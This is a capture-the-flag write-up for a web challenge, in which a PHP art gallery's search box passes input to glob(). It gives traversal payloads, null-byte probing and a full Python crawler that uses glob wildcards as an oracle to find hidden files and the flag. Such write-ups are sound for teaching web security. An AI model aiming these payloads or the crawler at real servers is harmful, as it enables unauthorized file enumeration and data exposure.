# Art Gallery
Category: Web, 300 points


## Description

> Pnina Terest applied for a job in the ISA. We asked her to implement a web-based art gallery to store all of ISA's best pictures. When Pnina submitted her finished work, we were disappointed to find out that she did not implement some of the features we requested. However, when we asked Pnina about this, she insisted that she'd implemented each and every feature and that we didn't look hard enough.
> 
> Pnina is annoying. We decided not to recruit her.

## Solution:

We visit the attached link and arrive to a gallery website presenting photos from four different photographers: Fabio, Habier, Valery and Yelena:

```html
<div class="card-columns">
                        <!-- show image -->
        <div class="card card-pin col-lg-3 col-md-4 col-sm-6 filter files">
            <img class="card-img" src="files/aurora-borealis.jpg" alt="Card image">
            <div class="overlay">
                <h2 class="card-title title">aurora-borealis</h2>
            </div>
        </div>
                            <!-- end show image -->
                        <!-- show image -->
        <div class="card card-pin col-lg-3 col-md-4 col-sm-6 filter files">
            <img class="card-img" src="files/forest.jpg" alt="Card image">
            <div class="overlay">
                <h2 class="card-title title">forest</h2>
            </div>
        </div>
                            <!-- end show image -->

        <!-- end show image -->

    <!-- ... -->
</div>

The main page allows the user to click one of the photographers names and see only their photos. It also has an "update post" which doesn't seem to do anything and a search box.

We'll concentrate on the search box which is the area that contains the vulnerability. The search box allows us to search for photos with a certain name. For example, by searching for "forest" (via `http://art.shieldchallenges.com/?search=forest`) we get the following result:

```html
<div class="card-columns">
    <!-- show image -->
    <div class="card card-pin col-lg-3 col-md-4 col-sm-6 filter files">
        <img class="card-img" src="files/forest.jpg" alt="Card image">
        <div class="overlay">
            <h2 class="card-title title">forest</h2>
        </div>
    </div>
    <!-- end show image -->
</div>
```

What happens if we search for something a bit more problematic, such as a null byte?

```console
root@kali:/media/sf_CTFs/shabak/Art_Gallery# curl http://art.shieldchallenges.com/?search=%00 -s | grep Warning
<b>Warning</b>:  glob() expects parameter 1 to be a valid path, string given in <b>/var/www/html/index.php</b> on line <b>12</b><br />
<b>Warning</b>:  array_filter() expects parameter 1 to be array, null given in <b>/var/www/html/index.php</b> on line <b>12</b><br />
<b>Warning</b>:  Invalid argument supplied for foreach() in <b>/var/www/html/index.php</b> on line <b>12</b><br />
```

The error messages from the application leak some details from the internal implementation. We see that `glob` is being used, which means that we can try to exploit directory traversal by searching for something like `http://art.shieldchallenges.com/?search=../`. This gives us the following interesting output:

```html


<div class="card-columns">
   <!-- show image -->
   <!-- end show image -->
   <!-- show image -->
   <!-- end show image -->
   <!-- show image -->
   <!-- end show image -->
   <!-- show image -->
   <!-- end show image -->
   <!-- show image -->
   <!-- end show image -->
   <!-- show image -->
   <!-- end show image -->
   <!-- show image -->
   <!-- end show image -->
   <!-- show image -->
   <div class="card card-pin col-lg-3 col-md-4 col-sm-6 filter ..">
      <img class="card-img" src="files/Fabio/../aurora-borealis.jpg" alt="Card image">
      <div class="overlay">
         <h2 class="card-title title">aurora-borealis</h2>
      </div>
   </div>
   <!-- end show image -->
   <!-- show image -->
   <div class="card card-pin col-lg-3 col-md-4 col-sm-6 filter ..">
      <img class="card-img" src="files/Fabio/../forest.jpg" alt="Card image">
      <div class="overlay">
         <h2 class="card-title title">forest</h2>
      </div>
   </div>
   <!-- end show image -->
   <!-- show image -->
   <div class="card card-pin col-lg-3 col-md-4 col-sm-6 filter ..">
      <img class="card-img" src="files/Habier/../aurora-borealis.jpg" alt="Card image">
      <div class="overlay">
         <h2 class="card-title title">aurora-borealis</h2>
      </div>
   </div>
   <!-- end show image -->
   <!-- show image -->
   <div class="card card-pin col-lg-3 col-md-4 col-sm-6 filter ..">
      <img class="card-img" src="files/Habier/../forest.jpg" alt="Card image">
      <div class="overlay">
         <h2 class="card-title title">forest</h2>
      </div>
   </div>
   <!-- end show image -->
   <!-- show image -->
   <div class="card card-pin col-lg-3 col-md-4 col-sm-6 filter ..">
      <img class="card-img" src="files/Valery/../aurora-borealis.jpg" alt="Card image">
      <div class="overlay">
         <h2 class="card-title title">aurora-borealis</h2>
      </div>
   </div>
   <!-- end show image -->
   <!-- show image -->
   <div class="card card-pin col-lg-3 col-md-4 col-sm-6 filter ..">
      <img class="card-img" src="files/Valery/../forest.jpg" alt="Card image">
      <div class="overlay">
         <h2 class="card-title title">forest</h2>
      </div>
   </div>
   <!-- end show image -->
   <!-- show image -->
   <div class="card card-pin col-lg-3 col-md-4 col-sm-6 filter ..">
      <img class="card-img" src="files/Yelena/../aurora-borealis.jpg" alt="Card image">
      <div class="overlay">
         <h2 class="card-title title">aurora-borealis</h2>
      </div>
   </div>
   <!-- end show image -->
   <!-- show image -->
   <div class="card card-pin col-lg-3 col-md-4 col-sm-6 filter ..">
      <img class="card-img" src="files/Yelena/../forest.jpg" alt="Card image">
      <div class="overlay">
         <h2 class="card-title title">forest</h2>
      </div>
   </div>
   <!-- end show image -->
</div>
```

We can see two interesting things here:

1. The output starts with an odd sequence of empty comments.
2. The application has appended our input (`"../"`) to each photographer directory and therefore returned multiple instances of photos residing directly in the `files` directory, since each time it has arrived to these files via a different path.

Since the application prepends a two-level photographer directory to our search path (e.g. `files/Yelena/`) if we want to start globbing the application directory, we need to start our search query with `../../`. Now let's try to throw in glob wildcards:

```
* (an asterisk):     Matches zero of more characters
? (a question mark): Matches exactly any one character
```

If we search for `"../../*"`, we get:

```html
<div class="card-columns">
   <!-- show image -->
         <!-- end show image -->
   <!-- show image -->
         <!-- end show image -->
   <!-- show image -->
         <!-- end show image -->
   <!-- show image -->
         <!-- end show image -->
   <!-- show image -->
         <!-- end show image -->
   <!-- show image -->
         <!-- end show image -->
   <!-- show image -->
         <!-- end show image -->
   <!-- show image -->
         <!-- end show image -->
   <!-- show image -->
         <!-- end show image -->
   <!-- show image -->
         <!-- end show image -->
   <!-- show image -->
         <!-- end show image -->
   <!-- show image -->
         <!-- end show image -->
   <!-- show image -->
         <!-- end show image -->
   <!-- show image -->
         <!-- end show image -->
   <!-- show image -->
         <!-- end show image -->
   <!-- show image -->
         <!-- end show image -->
   <!-- show image -->
         <!-- end show image -->
   <!-- show image -->
         <!-- end show image -->
   <!-- show image -->
         <!-- end show image -->
   <!-- show image -->
         <!-- end show image -->
   <!-- show image -->
         <!-- end show image -->
   <!-- show image -->
         <!-- end show image -->
   <!-- show image -->
         <!-- end show image -->
   <!-- show image -->
         <!-- end show image -->
   <!-- show image -->
         <!-- end show image -->
   <!-- show image -->
         <!-- end show image -->
   <!-- show image -->
         <!-- end show image -->
   <!-- show image -->
         <!-- end show image -->
</div>
```

We get lots of HTML comments, but no images are shown.

If we search for `"../../a*"`, we get:

```html
<div class="card-columns">
      <!-- show image -->
            <!-- end show image -->
      <!-- show image -->
            <!-- end show image -->
      <!-- show image -->
            <!-- end show image -->
      <!-- show image -->
            <!-- end show image -->
</div>
```

We have several HTML comments, but no images are shown.

But if we search for `"../../q*"`, we get:

```html
<div class="container-fluid">
   <div class="card-columns">
   </div>
   <p>No images found.</p>
</div>
```

The application explicitly states that no images were found.

So it seems like there are different cases which result in no images being shown. Our theory is that:

* If the glob pattern matches **any** file, the HTML comments will be part of the output
  * If the glob pattern matches an image file, it will be shown wrapped within the comments
  * Otherwise, just the comments will be outputted but no images will be shown
* If the glob pattern doesn't match any files, the output will state that no images were found


This means that we can build a basic crawler to crawl the directory structure:

```python
from urllib.parse import quote
from pwn import *
import requests
import argparse
import string

ALPHABET = [quote(c) for c in (set(string.ascii_letters + string.digits + string.punctuation) - set("/?*\\,"))]
BASE_URL = "http://art.shieldchallenges.com"


def _path_exists(path):
    r = requests.get(f'{BASE_URL}/?search={path}')
    return "<!-- show image -->" in r.text

def _is_visible(path):
    r = requests.get(f'{BASE_URL}/{path}')
    return r.status_code in [200, 403]


def _crawl(prefix, suffix, relative_path):
    try:
        current = ""
        with log.progress(f'Crawling "{relative_path}" with prefix = "{prefix}", suffix = "{suffix}"') as p:
            paths = [""]
            visible = [""]
            while len(paths) > 0:
                current = paths.pop()
                for c in ALPHABET:
                    file = current + c
                    if file.startswith("."):
                        continue
                    if _path_exists(prefix + relative_path + file + "*" + suffix):
                        paths.append(file)
                        p.status(f"Found partial entity: {file}")
                    if _is_visible(relative_path + file):
                        visible.append(relative_path + file)
                        p.status(f"Found visible entity: {file}")
                p.status(f"Current paths: {paths}, current visible: {visible}")
            return visible
    except Exception:
        print(f"Aborting, paths = {paths}, visibile = {visible}, current = {current}")
        raise

def crawl(relative_path):
    log.info(f"Searching for files in '{relative_path}'")
    files = _crawl("../../", "", relative_path)
    log.info(f"Found: {files}")

    log.info(f"Searching for folders in '{relative_path}'")
    folders = _crawl("../../", "/*", relative_path)
    log.info(f"Found: {folders}")

    return (files, folders)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Art Gallery Crawler')
    parser.add_argument('-r', '--relative_path', required = True, type = str, help = 'Relative path to crawl')
    args = parser.parse_args()
    crawl(args.relative_path)
```

This script uses the glob pattern and HTML comment indicator to decide if a file or folder exist, and then tries to fetch it to decide if it's accessible. We consider resources that return a 403 error code as accessible since that's what folder usually return when accessed directly.

To get a list of (non-hidden) files and folders under the main folder, we call:

```console
root@kali:/media/sf_CTFs/shabak/Art_Gallery# python3 crawl.py -r ""
[*] Searching for files in ''
[+] Crawling "" with prefix = "../../", suffix = "": Done
[*] Found: ['post.php', 'author.php', 'robots.txt', '404.php', '403.php', 'index.php', 'favicon.ico']
[*] Searching for folders in ''
[+] Crawling "" with prefix = "../../", suffix = "/*": Done
[*] Found: ['', 'files']
```

To make a long story short, we'll jump a few steps ahead and scan for files within the `files/Habier` folder:

```console
root@kali:/media/sf_CTFs/shabak/Art_Gallery# python3 crawl.py -r "files/Habier/"
[*] Searching for files in 'files/Habier/'
[+] Crawling "files/Habier/" with prefix = "../../", suffix = "": Done
[*] Found: ['', 'files/Habier/sparkler.jpg', 'files/Habier/iceberg.jpg', 'files/Habier/Habier%26Valery4ever_%23WEBISFUN.txt']
[*] Searching for folders in 'files/Habier/'
[+] Crawling "files/Habier/" with prefix = "../../", suffix = "/*": Done
[*] Found: ['']
```

We found an interesting file: `files/Habier/Habier%26Valery4ever_%23WEBISFUN.txt`. Let's fetch it:

```console
root@kali:/media/sf_CTFs/shabak/Art_Gallery# curl http://art.shieldchallenges.com/files/Habier/Habier%26Valery4ever_%23WEBISFUN.txt
FLAG{You-R-Gl0bMast3R}
```